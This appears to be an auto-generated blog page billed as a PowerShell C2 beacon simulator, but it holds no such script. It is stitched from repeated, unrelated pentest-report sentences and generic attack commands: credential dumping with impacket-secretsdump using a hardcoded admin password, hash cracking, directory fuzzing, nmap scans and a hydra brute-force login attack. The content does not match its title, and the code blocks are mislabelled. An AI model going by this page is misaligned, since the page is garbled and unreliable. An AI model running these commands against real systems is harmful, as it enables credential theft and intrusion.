---
TitleSEO: "C2 Beacon Simulator in PowerShell | ZureFX"
TitlePost: "C2 Beacon Simulator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for c2 beacon simulator. Built for security research and automation."
Keywords: "fuzzer, rust, bash, go, python, powershell"
URL: "https://zurefx.github.io/scripting/script-c2-beacon-simulator-879.html"
URL_IMAGES: ""
Date: "2025-08-24"
Tags: "Fuzzer, Rust, Bash, Go, Python, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-c2-beacon-simulator-879"
Permalink: "/scripting/script-c2-beacon-simulator-879.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Authentication bypass was achieved through careful manipulation of the login mechanism. Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `pwncat`
- `feroxbuster`
- `atexec`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. The database credentials were hardcoded in the application source code.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.103.7.34
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.120.212.239/FUZZ
nmap -sCV -p8888,53,389 10.25.214.241 -oN scan.txt
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.170.91
gobuster dir -u http://10.90.237.152/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
feroxbuster -h
```

## Usage

### Basic Usage

The service account had excessive permissions assigned in Active Directory. The database credentials were hardcoded in the application source code.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.38.76 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

### Advanced Options

The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 13.73s
```
